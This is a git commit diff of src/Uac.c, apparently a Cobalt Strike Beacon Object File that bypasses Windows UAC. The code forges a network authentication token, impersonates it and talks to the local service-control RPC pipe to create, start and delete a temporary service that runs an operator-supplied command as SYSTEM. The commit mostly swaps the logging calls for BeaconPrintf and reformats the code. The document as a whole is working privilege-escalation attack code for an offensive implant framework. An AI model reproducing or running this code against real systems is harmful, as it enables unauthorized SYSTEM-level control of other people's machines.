b4a9ca04109e75faa53e8ddfa45eda7766d9f2df
sha <email@example.com>
2024-08-14 20:45:18 +0800

    use BeaconPrintf

--- src/Uac.c
+++ src/Uac.c
@@ -1,19 +1,15 @@
 #define SECURITY_WIN32
-#include <windows.h>
-#include <stdio.h>
-#include "bofdefs.h"
-#include "beacon.h"
-#include "Token.c"
 #include "Base.c"
 #include "Rpc.c"
+#include "Token.c"
+#include "beacon.h"
+#include "bofdefs.h"
+#include <stdio.h>
+#include <windows.h>
 
-void go(char *args, int argc)
-{
-
-	if(!bofstart())
-	{
-		return;
-	}
+void go(char *args, int argc) {
+    if(!bofstart())
+        return;
 
     datap Parser = {0};
     PSTR pstrCommand = {0};
@@ -25,157 +21,136 @@ void go(char *args, int argc)
 
     BeaconDataParse(&Parser, args, argc);
     pstrCommand = BeaconDataExtract(&Parser, &dwCommand);
-    internal_printf("[+] Command: %s\n", pstrCommand);
-    
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Command: %s\n", pstrCommand);
 
     hCurrentToken = TokenCurrentHandle();
-    internal_printf("[+] Got Current Token: 0x%x\n", hCurrentToken);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Current Token: 0x%x\n", hCurrentToken);
 
-    if(!TokenQueryOwner(hCurrentToken, &CurrentUser, TOKEN_OWNER_FLAG_DEFAULT)){
+    if (!TokenQueryOwner(hCurrentToken, &CurrentUser,
+                         TOKEN_OWNER_FLAG_DEFAULT)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Owner !\n");
         return;
     }
 
-    internal_printf("[+] Current User: %ls\n", CurrentUser.Buffer);
-    if(!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount))
-    {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Privileges !\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Current User: %ls\n", CurrentUser.Buffer);
+    if (!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount)) {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[-] Can't Query Token User Privileges !\n");
         return;
     }
 
-    internal_printf("\n%-30s%-30s\n", "Privilege Name", "State");
-    internal_printf("============================= ===========================\n");
-
-    /* Printf Token Information */
-    for (int i = 0; i < dwPrivsCount; i++)
-    {
-        internal_printf("%-30s", pPrivsList[i].Name);
-        if (pPrivsList[i].Flags & SE_PRIVILEGE_ENABLED)
-            internal_printf("%-30s\n", "ENABLE");
-        else
-            internal_printf("%-30s\n", "DISABLE");
-    }
-
-    internal_printf("\n[*] Trying get Network Token\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Trying get Network Token\n");
     hNetworkToken = ForgeNetworkAuthToken();
 
-    if (hNetworkToken == INVALID_HANDLE_VALUE){
+    if (hNetworkToken == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Can't Get Network Token !\n");
         return;
     }
-    internal_printf("[+] Got Network Token: 0x%x\n", hNetworkToken);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Network Token: 0x%x\n", hNetworkToken);
 
-    if(!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList, &dwNetworkPrivsCount))
-    {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Netwok Token Privileges !\n");
+    if (!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList,
+                         &dwNetworkPrivsCount)) {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[-] Can't Query Netwok Token Privileges !\n");
         return;
     }
 
-    internal_printf("\n%-30s%-30s\n", "Privilege Name", "State");
-    internal_printf("============================= ===========================\n");
-
-    /* Printf Token Information */
-    for (int i = 0; i < dwNetworkPrivsCount; i++)
-    {
-        internal_printf("%-30s", pNetworkPrivsList[i].Name);
-        if (pNetworkPrivsList[i].Flags & SE_PRIVILEGE_ENABLED)
-            internal_printf("%-30s\n", "ENABLE");
-        else
-            internal_printf("%-30s\n", "DISABLE");
-    }
     ADVAPI32$ImpersonateLoggedOnUser(hNetworkToken);
 
     /* Run RPC Command */
 
-	RpcConnectionStruct *RpcConnection = (RpcConnectionStruct*)MSVCRT$malloc(sizeof(RpcConnectionStruct));
-	BYTE bServiceManagerObject[20];
-	BYTE bServiceObject[20];
-	DWORD dwReturnValue = 0;
-	char szServiceName[256];
-	DWORD dwServiceNameLength = 0;
-	char szServiceCommandLine[256];
-	DWORD dwServiceCommandLineLength = 0;
+    RpcConnectionStruct *RpcConnection =
+        (RpcConnectionStruct *)MSVCRT$malloc(sizeof(RpcConnectionStruct));
+    BYTE bServiceManagerObject[20];
+    BYTE bServiceObject[20];
+    DWORD dwReturnValue = 0;
+    char szServiceName[256];
+    DWORD dwServiceNameLength = 0;
+    char szServiceCommandLine[256];
+    DWORD dwServiceCommandLineLength = 0;
 
-	// generate a temporary service name
-	MSVCRT$memset(szServiceName, 0, sizeof(szServiceName));
-	MSVCRT$_snprintf(szServiceName, sizeof(szServiceName) - 1, "CreateSvcRpc_%u", KERNEL32$GetTickCount());
-	dwServiceNameLength = MSVCRT$strlen(szServiceName) + 1;
+    // generate a temporary service name
+    MSVCRT$memset(szServiceName, 0, sizeof(szServiceName));
+    MSVCRT$_snprintf(szServiceName, sizeof(szServiceName) - 1,
+                     "CreateSvcRpc_%u", KERNEL32$GetTickCount());
+    dwServiceNameLength = MSVCRT$strlen(szServiceName) + 1;
 
-	// set service command line
-	MSVCRT$memset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
-	MSVCRT$_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, "cmd /c %s", pstrCommand);
-	dwServiceCommandLineLength = MSVCRT$strlen(szServiceCommandLine) + 1;
-	internal_printf("\n[*] Connecting to SVCCTL RPC pipe...\n");
-   
+    // set service command line
+    MSVCRT$memset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
+    MSVCRT$_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1,
+                     "cmd /c start %s", pstrCommand);
+    dwServiceCommandLineLength = MSVCRT$strlen(szServiceCommandLine) + 1;
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Connecting to SVCCTL RPC pipe...\n");
+
     // Connect RPC
-    char* szPipePath = "\\\\127.0.0.1\\pipe\\ntsvcs";
-    char* pInterfaceUUID = "367abb81-9844-35f1-ad32-98f038001003";
+    char *szPipePath = "\\\\127.0.0.1\\pipe\\ntsvcs";
+    char *pInterfaceUUID = "367abb81-9844-35f1-ad32-98f038001003";
     DWORD dwInterfaceVersion = 2;
     HANDLE hFile = NULL;
 
-    hFile = KERNEL32$CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
+    hFile = KERNEL32$CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0,
+                                 NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "Can't Create File!\n");
         return;
     }
-    
-    MSVCRT$memset((void*)RpcConnection, 0, sizeof(RpcConnectionStruct));
+
+    MSVCRT$memset((void *)RpcConnection, 0, sizeof(RpcConnectionStruct));
     RpcConnection->hFile = hFile;
     RpcConnection->dwCallIndex = 1;
-    if (RpcBind(RpcConnection, pInterfaceUUID, 2) != 0)
-    {
+    if (RpcBind(RpcConnection, pInterfaceUUID, 2) != 0) {
         BeaconPrintf(CALLBACK_ERROR, "can't RPC Bind!\n");
         return;
     }
 
-	internal_printf("[*] Opening service manager...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opening service manager...\n");
 
-	// OpenSCManager
-	RpcInitialiseRequestData(RpcConnection);
-	RpcAppendRequestData_Dword(RpcConnection, 0);
-	RpcAppendRequestData_Dword(RpcConnection, 0);
-	RpcAppendRequestData_Dword(RpcConnection, SC_MANAGER_ALL_ACCESS);
-	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
-        BeaconPrintf(CALLBACK_ERROR, "Send Return Error!\n");
-		return;
-	}
-
-	// validate rpc output data length
-	if(RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
-        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc output Return Error!\n");
-		return;
-	}
-
-	// get return value
-	dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[20];
-
-	// check return value
-	if(dwReturnValue != 0)
-	{
-        BeaconPrintf(CALLBACK_ERROR, "Check Return Error!\n");
-		RpcDisconnect(RpcConnection);
-		return;
-	}
-
-	// store service manager object
-	MSVCRT$memcpy(bServiceManagerObject, RpcConnection->bProcedureOutputData, sizeof(bServiceManagerObject));
-
-	internal_printf("[*] Creating temporary service...\n");
-
-	/* /1* // CreateService *1/ */
+    // OpenSCManager
     RpcInitialiseRequestData(RpcConnection);
-    RpcAppendRequestData_Binary(RpcConnection, bServiceManagerObject, sizeof(bServiceManagerObject));
+    RpcAppendRequestData_Dword(RpcConnection, 0);
+    RpcAppendRequestData_Dword(RpcConnection, 0);
+    RpcAppendRequestData_Dword(RpcConnection, SC_MANAGER_ALL_ACCESS);
+    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0) {
+        // error
+        RpcDisconnect(RpcConnection);
+        BeaconPrintf(CALLBACK_ERROR, "Send Return Error!\n");
+        return;
+    }
+
+    // validate rpc output data length
+    if (RpcConnection->dwProcedureOutputDataLength !=
+        RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER) {
+        // error
+        RpcDisconnect(RpcConnection);
+        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc output Return Error!\n");
+        return;
+    }
+
+    // get return value
+    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[20];
+
+    // check return value
+    if (dwReturnValue != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "Check Return Error!\n");
+        RpcDisconnect(RpcConnection);
+        return;
+    }
+
+    // store service manager object
+    MSVCRT$memcpy(bServiceManagerObject, RpcConnection->bProcedureOutputData,
+                  sizeof(bServiceManagerObject));
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating temporary service...\n");
+
+    /* /1* // CreateService *1/ */
+    RpcInitialiseRequestData(RpcConnection);
+    RpcAppendRequestData_Binary(RpcConnection, bServiceManagerObject,
+                                sizeof(bServiceManagerObject));
     RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
-    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceName, dwServiceNameLength);
+    RpcAppendRequestData_Binary(RpcConnection, (BYTE *)szServiceName,
+                                dwServiceNameLength);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, SERVICE_ALL_ACCESS);
     RpcAppendRequestData_Dword(RpcConnection, SERVICE_WIN32_OWN_PROCESS);
@@ -184,7 +159,8 @@ void go(char *args, int argc)
     RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
-    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
+    RpcAppendRequestData_Binary(RpcConnection, (BYTE *)szServiceCommandLine,
+                                dwServiceCommandLineLength);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, 0);
@@ -192,32 +168,31 @@ void go(char *args, int argc)
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, 0);
-	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
+    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0) {
+        // error
+        RpcDisconnect(RpcConnection);
 
-		BeaconPrintf(CALLBACK_ERROR,"Rpc Send error");
-		return;
-	}
+        BeaconPrintf(CALLBACK_ERROR, "Rpc Send error");
+        return;
+    }
 
-	// validate rpc output data length
-    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_CREATE_SERVICE)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
+    // validate rpc output data length
+    if (RpcConnection->dwProcedureOutputDataLength !=
+        RPC_OUTPUT_LENGTH_CREATE_SERVICE) {
+        // error
+        RpcDisconnect(RpcConnection);
 
-		BeaconPrintf(CALLBACK_ERROR,"validate RPC output error");
-		return;
-	}
+        BeaconPrintf(CALLBACK_ERROR, "validate RPC output error");
+        return;
+    }
 
-	// get return value
+    // get return value
     dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[24];
 
     // check return value
-    if (dwReturnValue != 0)
-    {
-        BeaconPrintf(CALLBACK_ERROR, "CreateService error: %u\n", dwReturnValue);
+    if (dwReturnValue != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "CreateService error: %u\n",
+                     dwReturnValue);
 
         // error
         RpcDisconnect(RpcConnection);
@@ -225,89 +200,85 @@ void go(char *args, int argc)
         return;
     }
 
-	// store service object
-    MSVCRT$memcpy(bServiceObject, &(RpcConnection->bProcedureOutputData[4]), sizeof(bServiceObject));
-    internal_printf("[+] Execute '%s' as SYSTEM user...\n", pstrCommand);
+    // store service object
+    MSVCRT$memcpy(bServiceObject, &(RpcConnection->bProcedureOutputData[4]),
+                  sizeof(bServiceObject));
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Execute '%s' as SYSTEM user...\n",
+                 pstrCommand);
 
-	// StartService
+    // StartService
     RpcInitialiseRequestData(RpcConnection);
-    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
+    RpcAppendRequestData_Binary(RpcConnection, bServiceObject,
+                                sizeof(bServiceObject));
     RpcAppendRequestData_Dword(RpcConnection, 0);
     RpcAppendRequestData_Dword(RpcConnection, 0);
-	if(RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
+    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0) {
+        // error
+        RpcDisconnect(RpcConnection);
 
-		BeaconPrintf(CALLBACK_ERROR,"Send Request error");
-		return;
-	}
+        BeaconPrintf(CALLBACK_ERROR, "Send Request error");
+        return;
+    }
 
-	// validate rpc output data length
-	if(RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_START_SERVICE)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
+    // validate rpc output data length
+    if (RpcConnection->dwProcedureOutputDataLength !=
+        RPC_OUTPUT_LENGTH_START_SERVICE) {
+        // error
+        RpcDisconnect(RpcConnection);
 
-		BeaconPrintf(CALLBACK_ERROR,"Validate error");
-		return;
-	}
+        BeaconPrintf(CALLBACK_ERROR, "Validate error");
+        return;
+    }
 
-	// get return value
+    // get return value
     dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];
 
-	// check return value
-	if(dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT)
-	{
-		/* BeaconPrintf(CALLBACK_ERROR,"Check Return Value error"); */
-		/* // error */
-		/* RpcDisconnect(RpcConnection); */
-		/* return; */
-	}
+    // check return value
+    if (dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT) {
+        /* BeaconPrintf(CALLBACK_ERROR,"Check Return Value error"); */
+        /* // error */
+        /* RpcDisconnect(RpcConnection); */
+        /* return; */
+    }
 
-	internal_printf("[*] Deleting temporary service...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Deleting temporary service...\n");
 
-	// DeleteService
+    // DeleteService
     RpcInitialiseRequestData(RpcConnection);
-    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
-    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_DELETE_SERVICE) != 0)
-	{
-		// error
-		RpcDisconnect(RpcConnection);
+    RpcAppendRequestData_Binary(RpcConnection, bServiceObject,
+                                sizeof(bServiceObject));
+    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_DELETE_SERVICE) != 0) {
+        // error
+        RpcDisconnect(RpcConnection);
         BeaconPrintf(CALLBACK_ERROR, "DeleteService Error!\n");
-		return;
-	}
+        return;
+    }
 
-	// validate rpc output data length
-    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_DELETE_SERVICE)
-    {
+    // validate rpc output data length
+    if (RpcConnection->dwProcedureOutputDataLength !=
+        RPC_OUTPUT_LENGTH_DELETE_SERVICE) {
         // error
         RpcDisconnect(RpcConnection);
         MSVCRT$free(RpcConnection);
         return;
     }
 
-	// get return value
+    // get return value
     dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];
 
-	// check return value
-	if(dwReturnValue != 0)
-	{
+    // check return value
+    if (dwReturnValue != 0) {
         BeaconPrintf(CALLBACK_ERROR, "Validate Rpc Output Data Error!\n");
 
-		RpcDisconnect(RpcConnection);
+        RpcDisconnect(RpcConnection);
 
-		return;
-	}
+        return;
+    }
 
-	internal_printf("[+] Finished\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Finished\n");
 
-	// disconnect from rpc pipe
-	if(RpcDisconnect(RpcConnection) != 0)
-	{
-		return;
-	}
-
-    printoutput(TRUE);
-
+    // disconnect from rpc pipe
+    if (RpcDisconnect(RpcConnection) != 0) {
+        return;
+    }
 }
